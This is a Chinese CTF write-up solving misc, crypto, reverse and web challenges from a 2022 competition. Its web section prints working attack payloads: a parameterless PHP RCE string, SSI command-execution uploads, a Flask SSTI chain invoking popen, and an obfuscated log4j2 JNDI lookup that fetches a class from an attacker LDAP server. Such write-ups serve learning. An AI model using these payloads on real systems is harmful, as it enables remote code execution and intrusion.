---
uuid: dfde5854-dc92-4076-367e-77ec88e4df06
title: 长安“战疫”网络安全卫士守护赛wp
date: 2022-01-08 14:12:16
tags: 
       - 赛后复盘
       - CTF
categories: 
       - [赛后复盘]
       - [CTF]
---

长安“战疫”网络安全卫士守护赛wp

<!--more-->
![ ](https://img-blog.csdnimg.cn/img_convert/8825175c573bcf2bb2cfa5996483d7e0.png)
# Misc

### 【八卦迷宫】

按照迷宫走然后取字的拼音即可

```
cazy{zhanchangyangchangzhanyanghechangshanshananzhanyiyizhanyianyichanganyang}
```

### 【朴实无华的取证】

首先查看版本 imageinfo得到WinXPSP2x86

然后pslist，注意到![img](https://img-blog.csdnimg.cn/img_convert/f68bcaa5cb798736f81fa0f14bfc2541.png)

然后

![img](https://img-blog.csdnimg.cn/img_convert/fca20ff3fb0571b035c77287c52ea550.png)

发现目录是桌面而并非Desktop，重新filescan一下，导出有用信息![[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-r6LzEg9C-1641631822278)(mumuzi.assets/image-20220108103543050.png)]](https://img-blog.csdnimg.cn/img_convert/86143164837456a9398bcc63fc2cc168.png)

首先zip的密码是上面说的20211209

其次，得到的txt是加密函数，而密文在flag.png上。反过来写一个脚本：

```
s = 'fdcb[8ldq?zloo?fhuwdlqob?vxffhhg?lq?iljkwlqj?wkh?hslghplf]'
for i in s:
    if(ord(i)>=ord('a') and ord(i)<=ord('w')):
        print(chr(ord(i)-3),end='')
    elif(i == 'a'):
        print('x',end='')
    elif(i == 'b'):
        print('y',end='')
    elif(i == 'c'):
        print('z',end='')
    elif(i == "|"):
        print('_')
    else:
        print(chr(ord(i)+32),end='')
 #ca`_{Xian_šill_certainl__s˜cceed_in_fighting_the_epidemic}

```

查了一下certainl后面应该还有个y

然后前面那个单词是will，后面那个单词是succeed，于是得到flag提交正确

```
cazy{Xian_will_certainly_succeed_in_fighting_the_epidemic}
```

### 【无字天书】

导出HTTP流，在导出的其中两个文件发现hex串，都是很明显的zip，hex–>ascii，得到zip，打开zip得到两文件，一个key.ws一个flag.txt

ws很明显的whitespace，直接https://vii5ard.github.io/whitespace/得到key:XiAnWillBeSafe

然后flag.txt很明显的SNOW

.\SNOW.EXE -p XiAnWillBeSafe -C .\flag.txt


![[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-5EINTl6Z-1641631822281)(mumuzi.assets/image-20220108104800137.png)]](https://img-blog.csdnimg.cn/img_convert/1f7efd82018687f9338bf00b6fe86c76.png)

```
cazy{C4n_y0u_underSt4nd_th3_b0oK_With0ut_Str1ng}
```

### 【西安加油】

这道题我看了很久，在比赛中还是没有写出来。

查看流量包发现大量的base64串，导出http发现secret.txt，base64解码发现是zip，保存后打开发现是拼图

因为不知道大小，所以猜了一个12*4

命令montage *png -tile 12x4 -geometry 100x100+0+0 out2.png

然后用gaps

python3 gaps --image=out2.png --generations=10 --population=48 --size=100 --save

[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-68Bjlf7Q-1648815391417)(https://gitee.com/hzy2003628/drawing-bed/raw/master/images/20220313182357.png)]

```
cazy{make_XiAN_great_Again}
```

### 【binary】

文件头能看出来是class文件，直接扔jadx

数组转出来

```
s = [77, 68, 65, 119, 77, 68, 65, 119, 77, 68, 69, 119, 77, 84, 69, 120, 77, 68, 65, 119, 77, 68, 65, 119, 77, 68, 65, 120, 77, 84, 69, 120, 77, 84, 69, 119, 77, 84, 69, 120, 77, 68, 65, 119, 77, 68, 65, 119, 77, 70, 120, 117, 77, 68, 69, 120, 77, 84, 69, 120, 77, 68, 69, 119, 77, 84, 69, 119, 77, 84, 65, 120, 77, 68, 69, 120, 77, 84, 69, 120, 77, 68, 65, 119, 77, 84, 69, 120, 77, 68, 69, 120, 77, 68, 69, 120, 77, 84, 69, 120, 77, 70, 120, 117, 77, 68, 69, 119, 77, 68, 65, 120, 77, 68, 69, 119, 77, 68, 65, 119, 77, 84, 69, 120, 77, 84, 65, 119, 77, 68, 69, 120, 77, 84, 65, 120, 77, 68, 69, 120, 77, 68, 69, 120, 77, 68, 69, 119, 77, 68, 65, 120, 77, 70, 120, 117, 77, 68, 69, 119, 77, 68, 65, 120, 77, 68, 69, 120, 77, 68, 65, 119, 77, 68, 65, 120, 77, 84, 65, 119, 77, 68, 69, 120, 77, 84, 65, 119, 77, 68, 65, 119, 77, 84, 65, 120, 77, 68, 69, 119, 77, 68, 65, 120, 77, 70, 120, 117, 77, 68, 69, 119, 77, 68, 65, 120, 77, 68, 69, 120, 77, 84, 65, 120, 77, 84, 65, 120, 77, 84, 65, 119, 77, 84, 69, 119, 77, 84, 69, 119, 77, 84, 65, 120, 77, 84, 69, 120, 77, 68, 69, 119, 77, 68, 65, 120, 77, 70, 120, 117, 77, 68, 69, 120, 77, 84, 69, 120, 77, 68, 69, 119, 77, 84, 69, 120, 77, 68, 69, 119, 77, 68, 65, 119, 77, 68, 65, 119, 77, 84, 65, 119, 77, 84, 65, 119, 77, 68, 65, 120, 77, 68, 69, 120, 77, 84, 69, 120, 77, 70, 120, 117, 77, 68, 65, 119, 77, 68, 65, 119, 77, 68, 69, 119, 77, 84, 65, 120, 77, 68, 69, 119, 77, 84, 65, 120, 77, 68, 69, 119, 77, 84, 65, 120, 77, 68, 69, 119, 77, 84, 65, 120, 77, 68, 65, 119, 77, 68, 65, 119, 77, 70, 120, 117, 77, 84, 69, 120, 77, 84, 69, 120, 77, 84, 69, 119, 77, 68, 69, 119, 77, 68, 65, 119, 77, 68, 65, 119, 77, 68, 69, 119, 77, 68, 69, 120, 77, 68, 65, 120, 77, 84, 69, 120, 77, 84, 69, 120, 77, 84, 69, 120, 77, 86, 120, 117, 77, 84, 69, 119, 77, 68, 65, 120, 77, 68, 69, 119, 77, 84, 65, 120, 77, 68, 65, 119, 77, 68, 69, 119, 77, 84, 69, 120, 77, 84, 69, 120, 77, 68, 69, 119, 77, 68, 65, 119, 77, 68, 65, 120, 77, 84, 65, 119, 77, 70, 120, 117, 77, 68, 69, 119, 77, 84, 69, 119, 77, 84, 65, 119, 77, 68, 69, 120, 77, 68, 65, 120, 77, 68, 65, 120, 77, 68, 65, 119, 77, 68, 69, 119, 77, 68, 69, 120, 77, 68, 69, 119, 77, 84, 65, 120, 77, 84, 69, 119, 77, 86, 120, 117, 77, 84, 65, 120, 77, 84, 65, 119, 77, 68, 65, 119, 77, 84, 65, 119, 77, 84, 69, 120, 77, 84, 65, 119, 77, 84, 69, 119, 77, 68, 65, 120, 77, 84, 65, 120, 77, 68, 65, 119, 77, 68, 65, 120, 77, 68, 65, 120, 77, 70, 120, 117, 77, 84, 69, 120, 77, 68, 69, 120, 77, 84, 69, 120, 77, 84, 69, 120, 77, 68, 65, 120, 77, 68, 69, 119, 77, 84, 69, 119, 77, 84, 65, 119, 77, 68, 69, 120, 77, 68, 69, 119, 77, 84, 65, 120, 77, 84, 69, 119, 77, 70, 120, 117, 77, 84, 65, 120, 77, 68, 69, 120, 77, 68, 65, 119, 77, 84, 69, 120, 77, 68, 65, 119, 77, 68, 65, 119, 77, 68, 69, 120, 77, 68, 69, 119, 77, 68, 65, 119, 77, 68, 65, 119, 77, 68, 65, 119, 77, 68, 65, 120, 77, 70, 120, 117, 77, 68, 69, 120, 77, 68, 69, 119, 77, 84, 65, 119, 77, 84, 65, 119, 77, 68, 69, 119, 77, 68, 65, 120, 77, 84, 65, 120, 77, 84, 69, 119, 77, 84, 65, 120, 77, 84, 69, 119, 77, 84, 69, 120, 77, 84, 69, 119, 77, 86, 120, 117, 77, 68, 65, 120, 77, 68, 69, 119, 77, 68, 69, 119, 77, 68, 69, 120, 77, 84, 69, 120, 77, 84, 69, 119, 77, 84, 69, 120, 77, 68, 65, 119, 77, 68, 69, 120, 77, 68, 65, 120, 77, 68, 69, 119, 77, 68, 65, 120, 77, 70, 120, 117, 77, 68, 65, 120, 77, 68, 65, 119, 77, 84, 69, 119, 77, 84, 69, 120, 77, 68, 69, 120, 77, 68, 69, 120, 77, 68, 65, 120, 77, 84, 65, 119, 77, 84, 69, 119, 77, 68, 69, 120, 77, 68, 65, 120, 77, 84, 69, 119, 77, 86, 120, 117, 77, 84, 69, 120, 77, 68, 69, 119, 77, 68, 69, 120, 77, 68, 65, 119, 77, 84, 69, 120, 77, 84, 69, 120, 77, 84, 65, 120, 77, 84, 65, 120, 77, 68, 65, 120, 77, 84, 65, 119, 77, 68, 65, 119, 77, 68, 65, 120, 77, 70, 120, 117, 77, 68, 65, 119, 77, 68, 69, 120, 77, 84, 65, 120, 77, 68, 69, 119, 77, 68, 65, 120, 77, 84, 69, 119, 77, 68, 65, 119, 77, 68, 69, 119, 77, 84, 69, 119, 77, 84, 69, 120, 77, 84, 69, 120, 77, 68, 69, 120, 77, 86, 120, 117, 77, 84, 69, 119, 77, 84, 69, 119, 77, 68, 69, 120, 77, 68, 69, 119, 77, 84, 69, 119, 77, 84, 65, 119, 77, 84, 69, 119, 77, 68, 65, 120, 77, 68, 69, 119, 77, 68, 69, 120, 77, 68, 65, 119, 77, 68, 69, 119, 77, 70, 120, 117, 77, 68, 69, 119, 77, 84, 65, 119, 77, 84, 65, 119, 77, 84, 69, 120, 77, 84, 65, 119, 77, 84, 65, 119, 77, 68, 65, 119, 77, 84, 65, 119, 77, 84, 69, 120, 77, 68, 65, 120, 77, 68, 65, 120, 77, 68, 69, 120, 77, 86, 120, 117, 77, 68, 69, 119, 77, 84, 65, 120, 77, 68, 65, 120, 77, 84, 65, 119, 77, 68, 69, 120, 77, 84, 65, 119, 77, 68, 69, 120, 77, 68, 65, 120, 77, 68, 65, 119, 77, 68, 65, 120, 77, 68, 69, 119, 77, 84, 65, 119, 77, 70, 120, 117, 77, 84, 65, 119, 77, 84, 69, 119, 77, 84, 69, 120, 77, 84, 69, 119, 77, 84, 69, 120, 77, 68, 69, 120, 77, 68, 65, 120, 77, 68, 65, 120, 77, 84, 69, 120, 77, 84, 69, 119, 77, 84, 65, 120, 77, 84, 69, 119, 77, 86, 120, 117, 77, 84, 69, 119, 77, 84, 69, 119, 77, 68, 65, 120, 77, 68, 69, 120, 77, 84, 65, 119, 77, 68, 65, 119, 77, 68, 69, 119, 77, 84, 69, 120, 77, 68, 69, 120, 77, 68, 65, 119, 77, 84, 65, 120, 77, 84, 65, 120, 77, 70, 120, 117, 77, 68, 65, 120, 77, 84, 65, 119, 77, 84, 65, 119, 77, 68, 69, 120, 77, 84, 69, 119, 77, 84, 69, 119, 77, 68, 65, 120, 77, 84, 69, 120, 77, 68, 69, 119, 77, 68, 69, 119, 77, 68, 69, 120, 77, 84, 69, 119, 77, 86, 120, 117, 77, 68, 69, 119, 77, 84, 65, 119, 77, 68, 65, 119, 77, 84, 69, 120, 77, 68, 69, 119, 77, 84, 69, 120, 77, 68, 69, 120, 77, 68, 69, 119, 77, 84, 69, 120, 77, 84, 69, 120, 77, 68, 69, 119, 77, 68, 65, 120, 77, 70, 120, 117, 77, 68, 69, 119, 77, 84, 65, 120, 77, 84, 65, 120, 77, 84, 65, 119, 77, 84, 65, 119, 77, 84, 65, 119, 77, 68, 65, 119, 77, 68, 69, 120, 77, 68, 69, 119, 77, 68, 65, 120, 77, 68, 65, 120, 77, 84, 69, 120, 77, 86, 120, 117, 77, 68, 69, 120, 77, 68, 69, 119, 77, 68, 65, 120, 77, 68, 65, 119, 77, 84, 69, 120, 77, 68, 65, 120, 77, 68, 69, 120, 77, 68, 65, 120, 77, 84, 65, 120, 77, 84, 69, 120, 77, 84, 65, 119, 77, 84, 69, 119, 77, 70, 120, 117, 77, 68, 69, 120, 77, 84, 65, 119, 77, 84, 69, 120, 77, 84, 69, 119, 77, 68, 65, 119, 77, 68, 65, 120, 77, 68, 69, 120, 77, 68, 69, 120, 77, 68, 69, 120, 77, 84, 65, 119, 77, 84, 69, 120, 77, 84, 69, 119, 77, 70, 120, 117, 77, 68, 69, 119, 77, 68, 69, 120, 77, 68, 65, 120, 77, 68, 69, 120, 77, 68, 65, 120, 77, 68, 69, 119, 77, 68, 65, 120, 77, 68, 69, 120, 77, 84, 65, 120, 77, 84, 65, 119, 77, 68, 65, 119, 77, 68, 65, 119, 77, 70, 120, 117, 77, 84, 69, 120, 77, 84, 69, 120, 77, 84, 69, 119, 77, 84, 65, 120, 77, 84, 65, 119, 77, 84, 69, 120, 77, 68, 65, 120, 77, 84, 69, 119, 77, 68, 69, 119, 77, 84, 65, 120, 77, 84, 69, 119, 77, 84, 65, 120, 77, 86, 120, 117, 77, 68, 65, 119, 77, 68, 65, 119, 77, 68, 69, 120, 77, 84, 65, 119, 77, 68, 69, 120, 77, 84, 65, 120, 77, 84, 65, 120, 77, 68, 69, 120, 77, 68, 65, 119, 77, 84, 65, 120, 77, 68, 69, 119, 77, 68, 69, 119, 77, 70, 120, 117, 77, 68, 69, 120, 77, 84, 69, 120, 77, 68, 69, 120, 77, 84, 65, 119, 77, 84, 69, 119, 77, 84, 65, 120, 77, 68, 69, 120, 77, 68, 69, 119, 77, 84, 69, 119, 77, 68, 65, 120, 77, 84, 69, 119, 77, 84, 69, 120, 77, 86, 120, 117, 77, 68, 69, 119, 77, 68, 65, 120, 77, 68, 69, 119, 77, 68, 69, 120, 77, 68, 65, 119, 77, 68, 69, 120, 77, 68, 65, 120, 77, 84, 65, 120, 77, 68, 65, 119, 77, 68, 65, 119, 77, 68, 65, 119, 77, 68, 65, 120, 77, 70, 120, 117, 77, 68, 69, 119, 77, 68, 65, 120, 77, 68, 69, 119, 77, 84, 69, 120, 77, 84, 69, 119, 77, 84, 69, 119, 77, 68, 65, 120, 77, 84, 69, 120, 77, 84, 69, 120, 77, 84, 69, 120, 77, 68, 69, 119, 77, 68, 69, 120, 77, 86, 120, 117, 77, 68, 69, 119, 77, 68, 65, 120, 77, 68, 69, 119, 77, 84, 69, 119, 77, 84, 69, 120, 77, 84, 69, 120, 77, 84, 69, 119, 77, 68, 65, 119, 77, 68, 65, 120, 77, 68, 69, 119, 77, 84, 65, 120, 77, 68, 69, 120, 77, 70, 120, 117, 77, 68, 69, 120, 77, 84, 69, 120, 77, 68, 69, 120, 77, 84, 69, 120, 77, 84, 65, 119, 77, 68, 69, 119, 77, 84, 69, 119, 77, 84, 65, 119, 77, 84, 69, 120, 77, 84, 65, 119, 77, 68, 69, 120, 77, 68, 69, 120, 77, 70, 120, 117, 77, 68, 65, 119, 77, 68, 65, 119, 77, 68, 69, 120, 77, 84, 69, 120, 77, 84, 65, 120, 77, 84, 69, 120, 77, 68, 69, 120, 77, 68, 65, 119, 77, 68, 65, 119, 77, 68, 69, 119, 77, 68, 65, 120, 77, 84, 65, 119, 77, 65, 61, 61]
for i in s:
    print(chr(i),end='')
```

得到base64，解码是01串，明显的二维码

```
s = '0000000101110000000011111101110000000\n0111110101101010111110001110110111110\n0100010100001111000111010110110100010\n0100010110000011000111000001010100010\n0100010111011011001101101011110100010\n0111110101110100000001001000010111110\n0000000101010101010101010101010000000\n1111111100100000000100110011111111111\n1100010101010000101111110100000011000\n0101101000110010010000100110101011101\n1011000001001111001100011010000010010\n1110111111110010101101000110101011100\n1010110001110000000110100000000000010\n0110101001000100011011101011101111101\n0010100100111111101110000110010100010\n0010001101110110110011001100110011101\n1110100110001111111011010011000000010\n0000111010100011100000101101111110111\n1101100110101101001100010100110000100\n0101001001111001000001001110010010111\n0101010011000111000110010000010101000\n1001101111101110110010011111101011101\n1101100010111000000101110110001011010\n0011001000111101100011110100100111101\n0101000001110101110110101111110100010\n0101011011001001000000110100010011111\n0110100010001110010110011011111001100\n0111001111100000010110110111001111100\n0100110010110010100010111011000000000\n1111111101011001110011100101011101011\n0000000111000111011010110001010100100\n0111110111001101010110101100011101111\n0100010100110000110011010000000000010\n0100010101111101100011111111110100111\n0100010101101111111100000010101010110\n0111110111111000101101001111000110110\n0000000111111011110110000000100011000'
s = s.split('\n')

from PIL import Image
pic = Image.new('RGB',(37,37),(255,255,255))
for i in range(37):
    for j in range(37):
        if(s[i][j] == '0'):
            pic.putpixel((j,i),(0,0,0))
pic.show()
pic.save('fllllag.png')
```

扫码得到flag

```
flag{932b2c0070e4897ea7df0190dbf36ece}
```

### 【ez_Encrypt】

pyc的steg很明显是剑龙，注意python版本号，我用3.9没跑出来，3.6能跑

跑出来得到key：St3g1sV3ryFuNny

当然密文更明显是emoji-aes，解密得到flag

```
cazy{Em0j1s_AES_4nd_PyC_St3g_D0_yoU_l1ke}
```

### 【Ez_Steg】

这次题目的流量包都只需要导出HTTP就能做了

导出之后有个web123，是base64，同样cyberchef解码得到zip文件，用D盾扫![[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-fxGyG6JZ-1641631822289)(mumuzi.assets/image-20220108153726810.png)]](https://img-blog.csdnimg.cn/img_convert/fa4725c55a4a30121f2d3f40e0c9ba03.png)

![[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-jCDmViZG-1641631822293)(mumuzi.assets/image-20220108153734258.png)]](https://img-blog.csdnimg.cn/img_convert/85b509813a8594ab11516a7e62a893f3.png)

百度找一个解php混淆的，除去广告第一个就是https://www.zhaoyuanma.com/phpjm.html

解密得到flag![[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-U2XyWpF1-1641631822296)(mumuzi.assets/image-20220108153841460.png)]](https://img-blog.csdnimg.cn/img_convert/75b4fec6a65dff4e1d833ebcade21519.png)

```
cazy{PHP_ji4m1_1s_s00000_3aSyyyyyyyyyyy}
```

### 【pipicc】

可以看到 327006.bmp 中有一片噪点，猜测是对像素点有所修改，用 010editor 打开，可以在 BITMAPLINE 结构中看到 IHDR 头，看不见 png 头，手动补上.

![ ](https://img-blog.csdnimg.cn/img_convert/7e2bf3fbf28c6aed2343f3277d07dd1c.webp?x-oss-process=image/format,png)

补上以后

![ ](https://img-blog.csdnimg.cn/img_convert/3c397462c47f1d99e6689ff99a1fe757.webp?x-oss-process=image/format,png)

找到IEND块，手动提取出png文件

得到1.png

![ ](https://img-blog.csdnimg.cn/img_convert/61b5c5ec848727867bb12318c29fc11f.webp?x-oss-process=image/format,png)

用stegsolve打开1.png提取低位数据，在蓝色的低位可以看到

![ ](https://img-blog.csdnimg.cn/img_convert/e1c15d97e7f7a97bff0ba6dd56fe7e22.webp?x-oss-process=image/format,png)

d9ff，联想到jpg的文件尾，但是是倒序的，save bin提取出来得到1.bin

保存得到1.bin

搜索 d8 ff，从第一个d8 ff 开始 删掉后面的内容，然后倒序，可以用010editor的script里的stringreverse![ ](https://img-blog.csdnimg.cn/img_convert/19beb4a90516b84a93312734ae062940.webp?x-oss-process=image/format,png)

得到jpg图片

![图片](https://img-blog.csdnimg.cn/img_convert/a9a8b3ed2d5f6b0438281fac31a1825a.webp?x-oss-process=image/format,png)

# Crypto

### no_cry_no_can

就单纯的异或，通过格式cazy{找出key的值

```
key = b'\x5f\x11\x32\xff\x61'
s = b'<pH\x86\x1a&"m\xce\x12\x00pm\x97U1uA\xcf\x0c:NP\xcf\x18~l'
for i in range(len(s)):
    print(chr(key[i%5]^s[i]),end='')
```

```
cazy{y3_1s_a_h4nds0me_b0y!}
```

### no_can_no_bb

单纯的爆破key,给了key的范围是1,1<<20

```
from Crypto.Util.number import *
from Crypto.Cipher import AES
from tqdm import tqdm

def pad(m):
    tmp = 16-(len(m)%16)
    return m + bytes([tmp for _ in range(tmp)])

enc=b'\x9d\x18K\x84n\xb8b|\x18\xad4\xc6\xfc\xec\xfe\x14\x0b_T\xe3\x1b\x03Q\x96e\x9e\xb8MQ\xd5\xc3\x1c'
for i in tqdm(range(1<<20)):
    key=pad(long_to_bytes(i))
    aes=AES.new(key,AES.MODE_ECB)
    s = aes.decrypt(enc)
    if b'cazy{' in s:
        print(s)
```

### no_math_no_cry

```
from Crypto.Util.number import*

import gmpy2
s = 10715086071862673209484250490600018105614048117055336074437503883703510511248211671489145400471130049712947188505612184220711949974689275316345656079538583389095869818942817127245278601695124271626668045250476877726638182396614587807925457735428719972874944279172128411500209111406507112585996098530169
s -= 0x0338470
s = gmpy2.iroot(s,2)[0]
s = -s
s += (1<<500)
print(long_to_bytes(s))
```

```
cazy{1234567890_no_m4th_n0_cRy}
```
# Reverse

### combat_slogan

用ida打开看main就看见加密的flag了，上面函数明显的rot13

在线rot13解一下就行了，然后套上flag{}

```
flag{We_w11l_f1ght_t0_end_t0_end_cazy}
```

### cute_doge

IDA打开ctf1.exe，搜字符串，看见ZmxhZ3tDaDFuYV95eWRzX2Nhenl9

base64解码就是flag

```
flag{Ch1na_yyds_cazy}
```

### hello_py

```
uncompyle6 easy_py.cpython-38.pyc > easy_py.py
```

出来一个py文件，看了下，首先进encrypt1进行异或，再进入encrypt2进行异或，然后输出和Happy进行比较

既然是这样，那不妨反过来，把num从9到0改成从0到9，把该减的地方改成加，该执行的顺序也换一下。

```
# uncompyle6 version 3.7.4
# Python bytecode 3.8 (3413)
# Decompiled from: Python 3.8.7 (default, Dec 22 2020, 10:37:26) 
# [GCC 10.2.1 20201207]
# Embedded file name: C:\Users\Administrator\Desktop\easy_py.py
# Compiled at: 2021-12-28 15:45:17
# Size of source mod 2**32: 1099 bytes
import threading, time

def encode_1(n):
    global num
    while True:
        if num <= 9:
            flag[num] = flag[num] ^ num
            num += 1
            time.sleep(0.1)
        if num > 9:
            break


def encode_2(n):
    global num
    while True:
        if num <= 9:
            flag[num] = flag[num] ^ flag[(num + 1)]
            num += 1
            time.sleep(0.1)
        if num > 9:
            break


while True:
    Happy = [
     44, 100, 3, 50, 106, 90, 5, 102, 10, 112]
    num = 0
    f = input('Please input your flag:')
    if len(f) == 10:
        print('Your input is illegal')
    else:
        flag = [44, 100, 3, 50, 106, 90, 5, 102, 10, 112]
        if(1 == 2):
            print('crazymumuzi!')
        else:
            print("flag to 'ord':", flag)
            t1 = threading.Thread(target=encode_1, args=(1, ))
            t2 = threading.Thread(target=encode_2, args=(2,))
            t2.start()
            t1.start()
            t1.join()
            t2.join()


        for i in flag:
            print(chr(i),end='')
        if flag == Happy:
            print('Good job!')
        else:
            print('No no no!')
# okay decompiling easy_py.cpython-38.pyc
```

```
flag{He110_cazy}
```
# Web

### 【RCE_No_Para】

![image-20220113114247702](https://img-blog.csdnimg.cn/img_convert/24f8b6ee51942458e1ca88febe9090ad.png)

**正则匹配**
`/[^\W]+\((?R)?\)/`
`\W` 元字符用于查找非单词字符。
单词字符包括：a-z、A-Z、0-9，以及下划线。
故`[^\W]`可以匹配所有单词字符
`+`表示可以匹配一个或多个
`\(`和`\)`为左右括号
`(?R)?`表示递归整个模式

故本题的code只能为`a(b(c()))`这种形式，而不能为`a('xxx')`的形式，为无参数RCE

**get_defined_vars()**
该函数可以返回一个包含所有已定义变量列表的多维数组，这些变量包括环境变量、服务器变量和用户定义的变量。

![image-20220113114626736](https://img-blog.csdnimg.cn/img_convert/492606868e4c5b7ee1240c16d49da4cb.png)

当我们传入
`code=var_dump(get_defined_vars());&a=phpinfo();`
两变量时，我们自定义的变量a也出现在输出的变量中，我们便可以利用自定义的变量来绕过对code的限制进行rce
我们要想取到我们自定义变量的值，就需要使用函数来获取数组中的某一个值![在这里插入图片描述](https://img-blog.csdnimg.cn/img_convert/c9973d8e816565f1e25b5cadaaf66d18.png)

我们可以在get_defined_vars()前面加一个pos()用来去掉无关的变量

```
code=var_dump(pos(get_defined_vars()));&a=phpinfo();
```

![image-20220113114830289](https://img-blog.csdnimg.cn/img_convert/0b9dbb77b5c6abda4d809cd759a948eb.png)

如果此时再用一个pos()将会取出code的值，于是我们可以把两个变量的位置交换之后再用pos()便可以取出我们自定义变量的值

最终payload：
`a=system('cat flag.php');&code=eval(pos(pos(get_defined_vars())));`
在注释中找到flag

![image-20220113114930314](https://img-blog.csdnimg.cn/img_convert/6b5b32e9cbfc17a1386281281041897b.png)

*payload：`?code=system(array_rand(array_flip(current(get_defined_vars()))));&b=cat%09flag.php`*

### 【Baby_Upload】

![image-20220113120258881](https://img-blog.csdnimg.cn/img_convert/129136b313320b1da7499de255d81832.png)

做这道题会发现加了对文件内容的检测，过滤了一些符号，不过不会影响正常解题，过滤了`ph,ini,htaccess`，绕过不去，可以`shtml`来利用SSI注入RCE，但是过滤了很多命令，测试发现`ls`被过滤

`ls`被过滤可以使用`dir`来列目录：

`<!--#exec cmd="dir /"-->`，存为![image-20220113120501689](https://img-blog.csdnimg.cn/img_convert/5e1aa323a66df182405f00d7599cdd92.png)

`1.shtml`之后上传，列出根目录，得知flag在`fffffflllll11111aaaaa4444ggggg`下，可以构造出：

`<!--#exec cmd="cut -b 1-100 /ffffff?llll11111aaaaa4444ggggg"-->`

（强调一下，这里使用？是因为fl被过滤了，用？来匹配）

来读取文件，存为`2.shtml`后上传获得flag。![image-20220113120703608](https://img-blog.csdnimg.cn/img_convert/ae7a40536e23ee7973c69e279960cef7.png)

### 【flask】

访问主页发现注释中有提示

![ ](https://img-blog.csdnimg.cn/img_convert/723a664982706e4eb3f98e5b1b33192b.webp?x-oss-process=image/format,png)

/admin  /static.js  一段python代码 此段代码为后端的URL Filter 当请求js类静态文件时不需要认证，而在请求其他路径时则会被重定向到login 在flask的官方文档中

![ ](https://img-blog.csdnimg.cn/img_convert/7a550f751b0424e53280b3976be4cdf7.webp?x-oss-process=image/format,png)

在请求http://localhost/admin?test=123

![ ](https://img-blog.csdnimg.cn/img_convert/bf88a237bdc35899db9ffb34c2c18d04.webp?x-oss-process=image/format,png)

而请求/admin;xxx=1&test=123

![ ](https://img-blog.csdnimg.cn/img_convert/9fdf2034e8c6864b35616401982f53ec.webp?x-oss-process=image/format,png)

对`request.path` 来说其值为`/admin;xxx=1`并没有把`path parameter`去掉，在代码中的判断使用的是`request.full_path`
而在`request.full_path`中是包含了`query string`因此只要发起这样的请求：随意增加一个参数，并且参数值是以.js?结尾即可绕过校检`/admin?xxx=.js?`这里不能用`;`的原因是`request.path`并没有去掉 `path parameter` 在没有带上`query string`的情况下`full_path：/admin;x=.js?`满足`.js?`而`request.path:/admin;x=.js`路由表中没有`admin;x=.js`从而404

进入之后就是常规的ssti绕沙箱

![ ](https://img-blog.csdnimg.cn/img_convert/5146359cd1f86ddf4d5dbd6f2c9d8b1a.webp?x-oss-process=image/format,png)

```
aa:__class__ 
bb:__mro__
cc:__subclasses__
dd:__init__
ee:__globals__
```

`((((request|attr(request.cookies.get('aa'))|attr(request.cookies.get('bb'))|list).pop(-1)|attr(request.cookies.get('cc'))()).pop(117)|attr(request.cookies.get('dd'))|attr(request.cookies.get('ee'))).get('popen')('ls').read())`

![ ](https://img-blog.csdnimg.cn/img_convert/c9801d185e8c4c2cffc019efff18c473.webp?x-oss-process=image/format,png)

个人实践后发现貌似得到不了flag，也不知道原因在哪，下面是我的做题截图![image-20220115174547552](https://img-blog.csdnimg.cn/img_convert/8091f4f3ec63390e6622b3aba55baf4e.png)

请知道问题所在的大佬在评论区留言，谢谢

### 【Shiro?】

虽然登录界面伪造了一个shiro反序列化漏洞，但是实际漏洞点是在登录处的log4j2RCE漏洞。起一个ldap服务用于加载恶意类。运行环境Java版本较高需要bypass，即可正常攻击，可利用JNDIExploit工具进行攻击。用{::-n}等规则替换关键字和ip地址即可绕过规则， 也可用woodpecker生成payload， 在登录点username处输入payload即可

```
${${kBQ:aUR:j:-j}${MoYvsH:XAND:kG:-n}${EdAUxY:ck:pyjko:RIasA:-d}${hNhKmh:E:c:-i}${l:MLjM:-:}${qvO:STYFpz:ufnqW:V:-l}${G:mIWH:-d}${er:WLe:J:Pl:kCih:-a}${yHjTcA:FM:e:IktQAC:-p}${bvaWm:WW:-:}${kB:hGD:GPI:-/}${GC:VOUh:dqINYx:FK:n:-/}${v:KHSOc:-1}${Li:-9}${QtYkc:o:CQBzJl:D:-2}${KmJs:oJznyf:oIDrB:zmdK:-.}${F:ttejsH:k:rI:-1}${gN:-6}${tB:aJqxS:-8}${arq:J:wcas:d:-.}${rh:Rcz:-2}${z:Gvz:-.}${F:-2}${IsgAtf:-3}${CPsF:QRLx:dICC:rMp:-8}${o:Kk:hmhWl:XjIbnJ:-:}${kp:-1}${PeOoN:Y:mIFi:-3}${P:-8}${YMhc:EJ:uD:Wwytb:-9}${OLPfY:YTvJf:m:OXdV:-/}${rf:Uagil:PDiuPH:-T}${PBKgU:NhAyi:MpIN:-o}${awgT:-m}${aS:TCt:xnzwfF:UNaIr:Ppp:-c}${II:kNl:uHtTJi:WXfR:UjzJC:-a}${jBHdVl:PB:-t}${bkgfV:sYiJoF:uBIIDN:-B}${WROI:-y}${U:F:GAnUD:-p}${nQMY:-a}${yqYF:-s}${cVWi:rs:NFv:f:wmqbfG:-s}${XjHqnt:sP:uSjj:dWkcba:njEm:-/}${CY:-T}${qeW:-o}${tLipT:GjC:YGc:-m}${WmRvEy:pIxR:ur:LroYD:woOzUb:-c}${ye:d:sR:NsdI:-a}${OyXQBo:KSC:blRvH:iMLj:DxG:-t}${MOGEk:VnN:-E}${nxrEv:dKbcF:iEWJOf:-c}${Jd:GTm:rJ:KsWYpp:oz:-h}${UjBT:hMh:-o}}

